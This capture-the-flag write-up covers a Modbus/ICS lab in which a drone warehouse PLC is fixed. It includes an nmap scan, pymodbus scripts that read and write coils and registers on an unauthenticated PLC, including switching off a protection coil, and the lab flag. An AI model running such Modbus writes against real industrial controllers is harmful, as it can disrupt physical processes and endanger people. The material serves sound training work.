# ICS/Modbus: Claus for Concern

Learn to identify and exploit weaknesses in ICS systems by investigating a compromised drone delivery system where Christmas presents are being replaced with Easter eggs.

## Solution:

- Started by reading through the story - TBFC's drone delivery system has been compromised by "King Malhare" using the Eggsploit framework
- Found a crumpled note in the warehouse describing the register map and a critical warning about not changing HR0 while C11=True
- Need to understand SCADA systems, PLCs, and the Modbus protocol before attempting remediation

### Step 1: Initial Reconnaissance

- Started both AttackBox and target machine
- Performed an Nmap scan to identify running services:

```
nmap -sV -p 22,80,502 MACHINE_IP
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-24 10:33 -05
Nmap scan report for 10.201.65.50
Host is up (0.43s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp   open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
502/tcp  open  modbus  Modbus TCP
```

- Port 80: HTTP service hosting CCTV camera feed
- Port 502: Modbus TCP (PLC communication protocol)

### Step 2: Visual Confirmation

- Navigated to `http://MACHINE_IP` in browser
- Observed CCTV feed showing warehouse floor with robotic arms loading chocolate eggs instead of Christmas presents
- Status display showed "Compromised"

![CCTV Feed showing compromised system](https://i.imgur.com/placeholder.png)

### Step 3: Modbus Reconnaissance

- Created a reconnaissance script to read the current system state:

```
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient

PLC_IP = "MACHINE_IP"
PORT = 502
UNIT_ID = 1

# Connect to PLC
client = ModbusTcpClient(PLC_IP, port=PORT)
if not client.connect():
    print("Failed to connect to PLC")
    exit(1)

# Read holding registers
registers = client.read_holding_registers(address=0, count=5, slave=UNIT_ID)
if not registers.isError():
    hr0, hr1, hr2, hr3, hr4 = registers.registers
    print(f"HR0 (Package Type): {hr0}")  # 1 = Eggs
    print(f"HR1 (Delivery Zone): {hr1}")  # Zone 5
    print(f"HR4 (System Signature): {hr4}")  # 666 = Eggsploit

# Read coils
coils = client.read_coils(address=10, count=6, slave=UNIT_ID)
if not coils.isError():
    c10, c11, c12, c13, c14, c15 = coils.bits[:6]
    print(f"C10 (Inventory Verification): {c10}")  # False
    print(f"C11 (Protection/Override): {c11}")  # True - TRAP ACTIVE
    print(f"C15 (Self-Destruct Armed): {c15}")  # False - not armed yet

client.close()
```

**Key Findings:**
- HR0 = 1 (forcing chocolate eggs instead of gifts)
- HR4 = 666 (Eggsploit signature confirmed)
- C10 = False (inventory verification disabled)
- C11 = True (protection mechanism active - **THIS IS THE TRAP**)
- C13 = False (audit logging disabled)
- C15 = False (self-destruct not armed yet)

### Step 4: Understanding the Trap Mechanism

- The note warned: "Never change HR0 while C11=True! Will trigger countdown!"
- If we change HR0 before disabling C11:
  - C15 (Self-Destruct) arms immediately
  - 30-second countdown begins
  - C12 (Emergency Dump) activates
  - All inventory dumps to Zone 10 (ocean)
- **Critical realization**: Must disable C11 FIRST before any other changes

### Step 5: Safe Remediation

- Created restoration script with proper sequence:

```
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
import time

PLC_IP = "MACHINE_IP"
PORT = 502
UNIT_ID = 1

# Connect to PLC
client = ModbusTcpClient(PLC_IP, port=PORT)
client.connect()

print("Step 1: Verifying current system state...")
package_type = client.read_holding_registers(0, 1, UNIT_ID).registers[0]
print(f"  Package Type: {package_type} (1 = Eggs)")

print("\nStep 2: Disabling protection mechanism...")
client.write_coil(11, False, slave=UNIT_ID)
print("  Protection DISABLED - Safe to proceed")

print("\nStep 3: Setting package type to Christmas presents...")
client.write_register(0, 0, slave=UNIT_ID)
print("  Package type changed to: Christmas Presents")

print("\nStep 4: Enabling inventory verification...")
client.write_coil(10, True, slave=UNIT_ID)
print("  Inventory verification ENABLED")

print("\nStep 5: Enabling audit logging...")
client.write_coil(13, True, slave=UNIT_ID)
print("  Audit logging ENABLED")

print("\nStep 6: Verifying system restoration...")
christmas_restored = client.read_coils(14, 1, UNIT_ID).bits[0]
print(f"  Christmas Restored: {christmas_restored}")

# Read flag from registers
flag_result = client.read_holding_registers(20, 12, UNIT_ID)
flag_bytes = []
for reg in flag_result.registers:
    flag_bytes.append(reg >> 8)
    flag_bytes.append(reg & 0xFF)
flag = ''.join(chr(b) for b in flag_bytes if b != 0)
print(f"\nFlag: {flag}")

client.close()
```

- Executed the restoration script:

```
python3 restore_christmas.py
```

```
============================================================
SUCCESS - CHRISTMAS IS SAVED
============================================================

Christmas deliveries have been restored
The drones will now deliver presents, not eggs
Check the CCTV feed to see the results

Flag: THM{eGgMas0V3r}
============================================================
```

### Step 6: Verification

- Checked CCTV feed at `http://MACHINE_IP`
- System now showing Christmas presents being loaded
- Status changed from "Compromised" to restored

## Flag:

```
THM{eGgMas0V3r}
```

**Additional Answer:** Port used by Modbus TCP = `502`

## Concepts learnt:

- **SCADA Systems**: Supervisory Control and Data Acquisition systems act as the "nervous system" of industrial operations, bridging human operators and machinery through sensors, PLCs, monitoring systems, and historians

- **PLC (Programmable Logic Controller)**: Industrial computers designed for extreme reliability and harsh environments, executing control logic in real-time and interfacing directly with physical hardware

- **Modbus Protocol**: A simple request-response communication protocol from 1979 used between industrial devices. Critical security flaw: no authentication, encryption, or authorization

- **Modbus Data Types**:
  - **Coils**: Digital outputs (True/False) for motor status, valves, alarms
  - **Holding Registers**: Numeric values (0-65535) for configuration, setpoints, zone selection
  - **Discrete Inputs**: Read-only digital sensor readings
  - **Input Registers**: Read-only numeric sensor measurements

- **Modbus TCP**: Modern implementation running over TCP/IP on port 502, making previously isolated systems vulnerable to network-based attacks

- **ICS Security Weaknesses**: Legacy software, default credentials, no authentication in protocols like Modbus, designed for reliability over security, often connected to corporate networks despite "air-gap" myths

- **Trap Mechanisms in Industrial Systems**: Protection mechanisms can be weaponized - changing values while monitoring is active can trigger fail-safes, countdowns, or emergency protocols

## Notes:

- Initially tempted to directly change HR0 to fix the package type, but the warning note saved me from triggering the trap
- The order of operations is CRITICAL in ICS remediation - unlike typical cybersecurity where you might disable all protections at once, here the sequence matters for safety
- Modbus addressing uses zero-indexing (starts at 0, not 1) which caught me off guard initially
- The pymodbus library makes it surprisingly easy to interact with industrial control systems - this is both powerful for legitimate use and dangerous for attackers
- Real-world consequences: In actual ICS environments, triggering safety mechanisms could cause physical damage, production shutdowns, or even safety hazards
- The CCTV feed was more than just visual confirmation - it provided real-time feedback that changes were working
- King Malhare's signature (666 in HR4) was a calling card, similar to how real attackers sometimes leave traces

**Alternative approach considered:**
- Could have used `modbus-cli` tool instead of Python scripts for quick reads/writes
- Could have attempted to restore system without full reconnaissance (would have triggered trap)
- OpenPLC web interface on port was mentioned but bypassed - attacker went directly to Modbus protocol level

**What the trap would have done:**
- Immediate: C15 arms, starting 30-second countdown
- After 30s: C12 activates Emergency Dump Protocol
- HR1 changes to 10 (ocean disposal zone)
- All inventory gets dumped
- Challenge would need restart

